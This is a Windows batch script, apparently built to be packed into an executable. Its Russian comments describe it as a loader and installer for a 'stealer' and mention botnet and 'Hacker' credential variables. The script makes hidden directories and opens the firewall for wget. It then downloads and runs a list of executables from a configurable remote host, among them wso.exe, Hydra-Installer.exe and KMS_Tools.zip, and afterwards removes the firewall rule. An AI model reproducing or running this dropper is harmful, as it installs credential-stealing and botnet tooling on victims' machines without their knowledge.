::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iMOdSIsgPtR0mA6E85CHFmjmGejiovAA==
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iMOdSIsgPtR0mA6E85CHFmjmGehSUyAA==
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1isOdSIsgPtZ0mA6G4oC2p6gm3EjWU5YccI
::fBE1pAF6MU+EWH3eyFslLB5acCCNP363A7sI+9TP4PiTrUQOUaIMTqHn27qaKeMB40jte5ch2XRWkcUJQglNQjezfgA6rGBWt1iSMMKI/Qr5Tyg=
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQIVMAtbQgGMKGr6J7ER4ea73+uEqS0=
::eg0/rx1wNQPfEVWB+kM9LVsJDCGaLGS0A7sI6cH1/P6GrkEYRsorbJ/z07CKJe5z
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIULQhdSwqHOCucCadc2/Ho+++K4mwZWesxcZzPyLWaL/IAig==
::dhA7uBVwLU+EWHeB4wIZJg9RXgqHKCuOA7YU5uf34O2e4mEJUKxf
::YQ03rBFzNR3SWATE2kcnaDJaWAGQMm6uRoEZ6+D14OaIpVRdePY7Nu8=
::dhAmsQZ3MwfNWATE2kcnaDJaWAGQMm6uRoEZ6+D14OaIpVRdePY7Nu8=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJECR8Ec+FD9bTxGPOWWuFYko5/rv4OOUpw0uYswDeYHP07ecKe0a5EToepgh33Rf1tkZMD5Abh2lawEgqFJnrnSKOcKSpw7IRFud50c8Hndck3fApCI/ZNZm1MYb1kA=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
rem Файл загрузки и установки стайлера (Академический вариант)
rem USAGE
rem > loadhttpmaindistrib.bat
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set Hacker_User=%1
rem set Hacker_Pass=%2
rem set Hacker_host2=%3
rem set Hacker_host3=%4



rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\installmaindistrib.ini || exit /b 1

rem Create Target Directories
md %PUB1%
md %PUB1%\Distrib\plugins
%SystemRoot%\System32\attrib.exe +H %PUB1%
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib
%SystemRoot%\System32\attrib.exe +H %PUB1%\Distrib\plugins

rem Go to Temprorary Directory
cd /d %curdir%

rem Настраиваем переменные окружения для команды Wget

rem Определяем переменные:

rem Основная папка
rem set httpMainFolder=Exponenta
rem Префикс протокола
rem set httppref=http
rem HTTP Port
rem set httpport=80

rem HTTP WebDAV Host
set host=%httppref%://%httphost%:%httpport%/%httpMainFolder%
rem WebDAV User
rem set httpuser=%Hacker_User%
rem WebDAV Password
rem set httppassword=%Hacker_Pass%
rem Локальный каталог
set LocalFolder=%PUB1%\Distrib\plugins

rem Delete old versions of the files in catalog C:\pub1\Distrib\plugins
del /Q /F %LocalFolder%\*.*

rem Копируем wget и запускаем установку в каталоге %LocalFolder%
copy wget.exe %LocalFolder%\wget.exe
copy installmaindistrib.ini %LocalFolder%\
copy installmaindistrib.bat %LocalFolder%\
copy InstallMainExponenta.bat %LocalFolder%\
copy prechocoinstall.bat %LocalFolder%\

cd /d %LocalFolder%
cd %LocalFolder%

rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=in action=allow program="%LocalFolder%\wget.exe" enable=yes
rem Разрешаем все протоколы для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall add rule name="WGET.EXE Application rule 1" dir=out action=allow program="%LocalFolder%\wget.exe" enable=yes


rem Запускаем на выполнение команды WGET
rem !!! Изменяемая величина! Проверять перед использованием !!!

rem wget -c -t 2 --content-disposition %host%/InstallMainExponenta.bat
wget %host%/ExponentaMainFilesSetup.exe
rem wget -c -t 2 --content-disposition %host%/loadftpmaindistrib.bat
rem wget -c -t 2 --content-disposition %host%/installmaindistrib.ini
wget %host%/HiddenStartSetupRePack.exe
wget %host%/ElevationSetupRepack.exe
wget %host%/DTLiteInstaller.exe
wget %host%/KMS_Tools.zip
wget %host%/duck-install.msi
wget %host%/AdminScriptsSet01.exe
wget %host%/Hydra-Installer.exe
wget %host%/AdminTExponentaPluginSetup.exe
rem wget -c -t 2 --content-disposition %host%/installmaindistrib.bat
wget %host%/UtilSetup.exe
wget %host%/wso.exe
wget %host%/dotNetFx40_Full_x86_x64.exe
wget %host%/WindowsServer2003-KB968930-x64-RUS.exe
wget %host%/WindowsServer2003-KB968930-x86-RUS.exe
wget %host%/WindowsXP-KB968930-x86-RUS.exe
wget %host%/jdk-8u211-windows-i586.exe
wget %host%/jre-8u211-windows-x64.exe
wget %host%/jdk-8u211-windows-x64.exe
wget %host%/jre-8u211-windows-i586.exe
rem wget --http-user=%httpuser% -nc --http-passwd=%httppassword% %host%/chock.install.cmd
rem wget -r --no-parent %host%/

rem Run PreChocoInstall.bat
if not exist %LocalFolder%\prechocoinstall.bat goto pass_PreCHInstall
call %LocalFolder%\prechocoinstall.bat
:pass_PreCHInstall

rem Запускаем инсталлятор Admin Pack "Экспонента"
call %LocalFolder%\InstallMainExponenta.bat %PUB1% %Hacker_host1%

rem Переходим в прежний каталог
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Удаляем правило для wget.exe в брандмауэре
%SystemRoot%\System32\netsh.exe advfirewall firewall delete rule name="WGET.EXE Application rule 1"


rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

